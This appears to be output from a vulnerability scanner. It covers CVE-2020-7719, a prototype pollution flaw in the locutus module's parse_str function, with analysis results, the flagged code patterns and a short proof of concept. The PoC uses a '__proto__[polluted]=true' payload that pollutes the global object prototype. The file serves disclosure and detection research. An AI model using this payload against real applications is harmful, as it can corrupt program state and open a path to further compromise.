// Module Name : locutus
// Version : 2.0.11
// CVE number : CVE-2020-7719
// CVSS score : 9.8 (CVSS 3.0)
// Published Date : 01 Sep, 2020

/* DAPP analysis result
[+] FileSize(Bytes) : 713970
[+] Total Time(ms) : 7272
[+] Analysis Time(ms) : 3111
[+] Detected AST Pattern 1 : 2 
[+] Detected AST Pattern 2 : 25
SCC generation complete
 
**********Prototype Pollution v1 found!**********
[ 521242, 521257 ] obj = obj [ key ]
[ 521273, 521294 ] lastObj [ key ]= value
*/

// Prototype pollution source code patterns detected
/*
function parse_str ( str, array ) {
	...
	obj = obj[key]          //AST Pattern 1
	...
	lastObj[key] = value    //AST Pattern 2
	...
}
*/

// POC of CVE-2020-7719
const locutus = require('locutus')
locutus.php.strings.parse_str('__proto__[polluted]=true', {})
console.log(polluted) //true